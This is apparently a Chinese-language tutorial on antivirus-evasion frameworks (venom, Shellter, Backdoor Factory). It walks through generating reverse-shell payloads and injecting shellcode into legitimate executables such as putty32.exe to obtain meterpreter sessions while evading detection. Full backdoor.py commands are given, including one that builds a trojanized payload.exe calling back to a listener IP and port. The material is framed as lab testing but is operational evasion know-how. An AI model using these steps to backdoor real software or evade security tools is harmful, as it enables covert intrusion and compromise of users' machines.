## 免杀框架

### 1\. venom框架

cd venom进入venom文件夹中./venom.sh进入venom框架中

选择2进入windows的payload模块

[![wps122](https://image.3001.net/images/20201116/1605508609.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112221868-553127500.jpg)

再次2选择dll的shell编码格式

[![wps123](https://image.3001.net/images/20201116/1605508610.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112222686-2082083357.jpg)

输入要反弹到的ip地址

[![wps124](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112223444-475695.jpg)

输入端口

[![wps125](https://image.3001.net/images/20201116/1605508610.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112224034-652972662.jpg)

选择payload

[![wps126](https://image.3001.net/images/20201116/1605508611.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112224634-977192733.jpg)

填写生成文件的文件名

[![wps127](https://image.3001.net/images/20201116/1605508611.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112225301-1060185623.jpg)

选择文件后缀

[![wps128](https://image.3001.net/images/20201116/1605508612.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112225904-1090359552.jpg)

选择下发方式

[![wps129](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112226541-1101119576.jpg)

这里选择手动下放进行测试，将两个文件复制粘贴到靶机上

[![wps130](https://image.3001.net/images/20201116/1605508613.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112227263-1385582649.jpg)

运行installer.bat,显示成功反弹meterpreter会话

[![wps131](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112227931-349041052.jpg)

选择8进入逃避恶意接口检测的payload

[![wps132](https://image.3001.net/images/20201116/1605508614.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112228616-215905449.jpg)

接着选择4选择返回meterpreter会话

[![wps133](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112229334-1524959349.jpg)

[![wps134](https://image.3001.net/images/20201116/1605508614.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112229924-1415594441.jpg)

[![wps135](https://image.3001.net/images/20201116/1605508615.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112230508-2087255820.jpg)

将bat和ps1放到同一个文件夹下运行bat文件

[![wps136](https://image.3001.net/images/20201116/1605508615.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112231127-1836907096.jpg)

成功反弹meterpreter会话

[![wps137](https://image.3001.net/images/20201116/1605508616.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112231849-2143471523.jpg)

### 2\. shelltel框架

windows下直接双击shellter.exe

[![wps138](https://image.3001.net/images/20201116/1605508616.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112232605-31352145.jpg)

A：自动选择shellcode

M：手动配置参数

H：help  
  
---  
  
选择A自动选择shellcode，N不检查当前版本

[![wps139](https://image.3001.net/images/20201116/1605508617.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112233361-727267030.jpg)

输入要注入的程序

[![wps140](https://image.3001.net/images/20201116/1605508618.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112233900-88774420.jpg)

首先会把pe文件备份到shellter-backups文件夹下，原本的文件被覆盖了。

[![wps141](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112234439-1262812663.jpg)

是否启用隐藏模块（这里选择不启用N）

[![wps142](https://image.3001.net/images/20201116/1605508618.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112235050-504335847.jpg)

选择payload模块

[![wps143](https://image.3001.net/images/20201116/1605508619.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112235803-1008056864.jpg)

输入ip和端口

[![wps144](https://image.3001.net/images/20201116/1605508619.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112236578-940511626.jpg)

双击被注入的程序程序

[![wps145](https://image.3001.net/images/20201116/1605508620.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112237192-712002404.jpg)

成功反弹会话

[![wps146](https://image.3001.net/images/20201116/1605508620.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112237741-1444719834.jpg)

### 3\. backdoor factory（BDP）

检测pe文件是否允许注入shellcode

[![wps147](https://image.3001.net/images/20201116/1605508621.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112238412-609198603.jpg)

./backdoor.py -f ../putty32.exe -S

-f：要注入的pe文件

-c：code cave(代码裂缝)

-l：代码裂缝⼤⼩

-s：选择使⽤ payload 类型

-S：检测pe文件是否支持注入shellcode

-H：选择回连服务器地址

-P：回连服务器端⼝

-J：使⽤多代码裂缝注⼊  
  
---  
  
探测可注入的裂缝大小

[![wps148](https://image.3001.net/images/20201116/1605508621.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112239230-1467246553.jpg)

./backdoor.py -f ../putty32.exe -c -l 200  
  
---  
  
查看可用的payload

[![wps149](https://image.3001.net/images/20201116/1605508622.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112240120-866811515.jpg)

[![wps150](https://image.3001.net/images/20201116/1605508623.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112240972-34730958.jpg)

./backdoor.py -f ../putty32.exe -s show  
  
---  
  
生成免杀pe文件

[![wps151](https://image.3001.net/images/20201116/1605508624.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112241756-819371372.jpg)

./backdoor.py -f ../putty32.exe -s iat_reverse_tcp_stager_threaded -H
10.211.55.2 -P 3333 -J -o payload.exe  
  
---  
  
成功运行putty32并且反弹会话

[![wps152](https://image.3001.net/images/20200701/1593550745.png!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112242529-2014173899.jpg)

[![wps153](https://image.3001.net/images/20201116/1605508624.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112243162-1837511651.jpg)

